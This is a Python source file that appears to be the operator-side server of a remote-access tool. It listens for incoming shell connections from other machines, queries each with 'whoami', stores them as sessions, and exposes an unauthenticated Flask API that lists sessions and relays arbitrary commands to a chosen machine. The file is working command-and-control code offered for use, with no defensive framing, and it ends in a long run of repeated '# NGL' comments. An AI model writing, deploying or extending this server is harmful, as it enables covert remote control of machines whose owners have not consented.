import time
from datetime import datetime
import socket
import threading
from flask_cors import CORS

import signal
import sys
from colorama import Fore,Style;blue = Fore.BLUE;red = Fore.RED;warn = Fore.YELLOW;green = Fore.GREEN;gray = Fore.LIGHTBLACK_EX;white_red = Fore.LIGHTRED_EX;white_green = Fore.LIGHTGREEN_EX;white_warn = Fore.LIGHTYELLOW_EX;white_blue = Fore.LIGHTBLUE_EX;reset_colors = Style.RESET_ALL; pink = Fore.MAGENTA
from flask import Flask, request, jsonify
import os; os.system("cls")
HOST = "0.0.0.0" 
PORT = 9999
app = Flask(__name__)
CORS(app)
class Console:
    def __init__(self,debug=False) -> None:
        self.debug = debug
    def error(self,x):
        x = str(x)
        if self.debug:
            print(f"{red}[- ERROR -]{reset_colors} - {gray}[{datetime.now().date()} - {datetime.now().now().strftime('%H:%M:%S')}]{reset_colors} |\t {white_red}{x}{reset_colors}")
        else:
            print(f"{red}[-]{reset_colors}\t {red}{x}{reset_colors}")
    def success(self,x):
        if self.debug:
            print(f"{green}[+ Success +]{reset_colors} - {gray}[{datetime.now().date()} - {datetime.now().now().strftime('%H:%M:%S')}]{reset_colors} |\t {white_green+x}{reset_colors}")
        else:
            print(f"{green}[+]{reset_colors}\t {white_green+x}{reset_colors}")
    def warn(self,x,t=0):
        if self.debug:
            print(f"{warn}[! {'WARNING' if t == 0 else 'FAILED'} !]{reset_colors} - {gray}[{datetime.now().date()} - {datetime.now().now().strftime('%H:%M:%S')}]{reset_colors} |\t {white_warn+x}{reset_colors}")
        else:
            print(f"{warn}[!]{reset_colors}\t {white_warn+x}{reset_colors}")
    def info(self,x):
        if self.debug:
            print(f"{blue}[* INFO *]{reset_colors} - {gray}[{datetime.now().date()} - {datetime.now().now().strftime('%H:%M:%S')}]{reset_colors} |\t {white_blue+x}{reset_colors}")
        else:
            print(f"{blue}[*]{reset_colors}\t {white_blue+x}{reset_colors}")
    def input(self, x):
        if self.debug:
            x = input(f"{blue}[| INPUT |]{reset_colors} - {gray}[{datetime.now().date()} - {datetime.now().now().strftime('%H:%M:%S')}]{reset_colors} |\t {white_blue+x}{reset_colors}{white_warn}")
        else:
            x = input(f"{blue}[|]{reset_colors}\t {white_blue+x}{reset_colors}{white_warn}")
        return x
console = Console(debug=True)
sessions = {}
sessions_lock = threading.Lock()
class Session:
    def __init__(self, conn: socket.socket, user) -> None:
        self.session = conn
        self.user = user
        self.date = str(datetime.now())

    def executeCommand(self, cmd):
        self.session.send(cmd.encode())
        response = self.session.recv(4096).decode()
        return response
def handleClient(conn: socket.socket, addr):
    console.info(f"Connection from ({addr[0]}:{addr[1]}) established.")
    with sessions_lock:
        conn.send("whoami".encode())
        user = conn.recv(1024).decode().strip().split("\\")[0]
        sessions[f"{addr[0]}:{addr[1]}"] = Session(conn, f"{user}@{addr[0]}")

def getSessions():
    with sessions_lock:
        ss = {}
        for session in sessions:
            address = session
            session: Session = sessions[session]
            ss[address] = {
                "user": session.user,
                "date": session.date
            }
        return ss

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen()
    console.success(f"Listening on {HOST}:{PORT}")

    while True:
        try:
            conn, addr = server.accept()
            client_thread = threading.Thread(target=handleClient, args=(conn, addr))
            client_thread.daemon = True
            client_thread.start()
        except KeyboardInterrupt:
            print("\nServer shutting down.")
            break
    server.close()
@app.route("/getSessions", methods=["GET"])
def getSessionsEndpoint():
    return jsonify(getSessions())
@app.route("/execute", methods=["POST"])
def executeEndpoint():
    json = request.json
    try:
        command = json.get("command")
        sessionAddress = json.get("session")
        session: Session = sessions[sessionAddress]
        output = session.executeCommand(command)
        return jsonify({"output": output})
    except:
        if sessionAddress in sessions:
            console.warn(f"Session closed {gray}({sessionAddress}){warn} terminating session ...")
            del sessions[sessionAddress]
        return jsonify({"error": "Invalid session"}), 400
@app.route("/removeUser", methods=["POST"])
def removeUserEndpoint():
    json = request.json
    try:
        sessionAddress = json.get("address")
        del sessions[sessionAddress]
        return jsonify({"message": "User removed successfully"}), 200
    except:
        return jsonify({"error": "User not found"}), 404
if __name__ == "__main__":
    thread = threading.Thread(target=main)
    thread.start()
    app.run(host="0.0.0.0", port=6666, use_reloader=False)


# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
# NGL
